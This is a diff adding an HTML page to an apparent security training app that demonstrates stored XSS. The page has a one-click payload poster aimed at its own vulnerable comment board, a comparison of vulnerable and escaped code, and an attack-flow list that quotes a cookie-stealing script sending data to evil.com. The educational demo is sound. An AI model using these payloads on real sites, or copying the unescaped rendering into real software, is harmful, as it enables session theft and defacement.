@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stored XSS — Vulnerable</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <nav class="topnav">
+    <a href="/" class="nav-home">&#8962; Home</a>
+    <span class="badge" style="background:#fef2f2;color:#dc2626;border:1.5px solid #dc2626">VULNERABLE</span>
+    <a href="/secure/stored.html" class="switch-btn switch-to-secure">View Secure Version →</a>
+  </nav>
+
+  <main class="container">
+    <div class="page-header">
+      <h1>Stored XSS</h1>
+      <p>Payloads are saved to the server without sanitization and rendered raw — every visitor who loads the page executes any injected script automatically.</p>
+    </div>
+
+    <div class="note vuln">
+      <span>&#9888;</span>
+      <div><strong>Root cause:</strong> Comment body is stored as-is and injected into HTML with no escaping. A payload posted once persistently attacks every future visitor — no crafted link required.</div>
+    </div>
+
+    <!-- Quick payload poster -->
+    <p class="section-title">Try It — One-Click Payload Poster</p>
+    <div class="quick-post">
+      <h3>&#9888; Click a payload to post it directly to the vulnerable board</h3>
+      <p>Posts as "Attacker" — then opens the comment board in a new tab where the script fires.</p>
+      <button class="payload-tag" onclick="postPayload('<script>alert(\'Stored XSS — fires for every visitor\')<\/script>')">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</button>
+      <button class="payload-tag" onclick="postPayload('<img src=x onerror=alert(document.cookie)>')">&lt;img src=x onerror=alert(document.cookie)&gt;</button>
+      <button class="payload-tag" onclick="postPayload('<script>document.body.style.background=\'red\'<\/script>')">&lt;script&gt;document.body.style.background='red'&lt;/script&gt;</button>
+      <button class="payload-tag" onclick="postPayload('<script>document.body.innerHTML=\'<h1 style=color:red>&#128480; Page Defaced</h1>\'<\/script>')">&lt;script&gt;document.body.innerHTML='Defaced'&lt;/script&gt;</button>
+    </div>
+
+    <!-- Manual board link -->
+    <div style="background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:16px;margin-bottom:24px">
+      <p style="font-size:.875rem;color:#4b5563;margin-bottom:10px">Or open the board directly and type your own payload:</p>
+      <a href="/api/comments" class="btn btn-vuln" target="_blank">Open Vulnerable Comment Board &#8599;</a>
+    </div>
+
+    <!-- Code comparison -->
+    <p class="section-title">Code — Vulnerable vs Secure</p>
+    <div class="demo-grid">
+      <div class="panel">
+        <div class="panel-header vuln">&#128308; VULNERABLE — GET /api/comments</div>
+        <div class="panel-body">
+          <div class="code-block"><span class="c-gray">// ❌ Raw body injected into HTML</span>
+comments.<span class="c-yellow">map</span>(c => `
+  &lt;div class="comment-body"&gt;
+    <span class="c-red">${c.body}</span>
+  &lt;/div&gt;
+`);</div>
+          <div class="note vuln" style="margin-top:8px;margin-bottom:0">
+            <span>&#9888;</span>
+            <span>Attacker's <code>&lt;script&gt;</code> in <code>c.body</code> becomes live HTML for every visitor.</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header secure">&#128994; SECURE — GET /api/comments/safe</div>
+        <div class="panel-body">
+          <div class="code-block"><span class="c-gray">// ✅ Escape each field at render time</span>
+comments.<span class="c-yellow">map</span>(c => `
+  &lt;div class="comment-body"&gt;
+    <span class="c-green">${escapeHtml(c.body)}</span>
+  &lt;/div&gt;
+`);</div>
+          <div class="note secure" style="margin-top:8px;margin-bottom:0">
+            <span>&#10003;</span>
+            <span><code>&lt;script&gt;</code> → <code>&amp;lt;script&amp;gt;</code> — displays as text, never executes.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack flow -->
+    <div class="how-it-works">
+      <h2>Attack Flow — Why Stored XSS Is Most Dangerous</h2>
+      <ul class="step-list">
+        <li><span class="step-num">1</span><div>Attacker posts a comment containing <code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code>.</div></li>
+        <li><span class="step-num">2</span><div>Server saves it verbatim to the database — no validation or encoding.</div></li>
+        <li><span class="step-num">3</span><div>Every user who visits the comments page receives the page with the script embedded.</div></li>
+        <li><span class="step-num">4</span><div>Browser executes the script — attacker harvests session cookies of every visitor passively.</div></li>
+        <li><span class="step-num">5</span><div>No phishing link required. Normal browsing is enough to trigger the attack.</div></li>
+      </ul>
+    </div>
+
+    <a href="/" class="btn btn-back">← Back to All Demos</a>
+  </main>
+
+  <script>
+    function postPayload(payload) {
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = '/api/comments';
+      form.target = '_blank';
+
+      const author = document.createElement('input');
+      author.name = 'author';
+      author.value = 'Attacker';
+
+      const body = document.createElement('input');
+      body.name = 'body';
+      body.value = payload;
+
+      form.appendChild(author);
+      form.appendChild(body);
+      document.body.appendChild(form);
+      form.submit();
+      document.body.removeChild(form);
+    }
+  </script>
+</body>
+</html>
